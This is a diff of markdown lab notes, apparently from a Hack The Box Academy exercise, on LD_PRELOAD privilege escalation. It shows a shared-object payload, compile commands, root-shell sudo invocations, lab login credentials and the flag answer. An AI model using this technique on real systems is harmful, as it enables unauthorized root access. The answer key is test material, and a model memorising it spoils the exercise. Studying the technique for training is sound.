@@ -5,7 +5,7 @@ There are multiple methods for specifying the location of dynamic libraries, so 
 
 Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.
 
-```sh
+```shellsession
 $ ldd /bin/ls
 
     linux-vdso.so.1 =>  (0x00007fff03bc7000)
@@ -22,7 +22,7 @@ The image above lists all the libraries required by `/bin/ls`, along with their 
 ## LD_PRELOAD Privilege Escalation
 We need a user with sudo privileges.
 
-```sh
+```shellsession
 $ sudo -l
 
 Matching Defaults entries for daniel.carter on NIX02:
@@ -50,13 +50,13 @@ system("/bin/bash");
 
 We can compile this as follows:
 
-```sh
+```shellsession
 $ gcc -fPIC -shared -o root.so root.c -nostartfiles
 ```
 
 Finally, we can escalate privileges using the below command. 
 
-```sh
+```shellsession
 $ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
 
 id
@@ -67,7 +67,7 @@ uid=0(root) gid=0(root) groups=0(root)
 SSH to 10.129.66.92 (ACADEMY-LPE-NIX02), with user `htb-student` and password `Academy_LLPE!`
 1. Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory. **Answer: 6a9c151a599135618b8f09adc78ab5f1**
    - Notice we can run `openssl` as root:
-        ```sh
+        ```shellsession
         $ sudo -l
         Matching Defaults entries for htb-student on NIX02:
             env_reset, mail_badpass,
@@ -78,7 +78,7 @@ SSH to 10.129.66.92 (ACADEMY-LPE-NIX02), with user `htb-student` and password `A
             (root) NOPASSWD: /usr/bin/openssl
         ```
    - Create a dynamically linked shared object library that set the group and user id of the process to root:
-        ```sh
+        ```shellsession
         $ cat /tmp/root.c
         #include <stdio.h>
         #include <sys/types.h>
@@ -94,7 +94,7 @@ SSH to 10.129.66.92 (ACADEMY-LPE-NIX02), with user `htb-student` and password `A
         $ gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
         ```
    - Escalate privilege by running openssl with the shared library:
-        ```sh
+        ```shellsession
         $ sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl 
         root@NIX02:~# cat /root/ld_preload/flag.txt 
         6a9c151a599135618b8f09adc78ab5f1
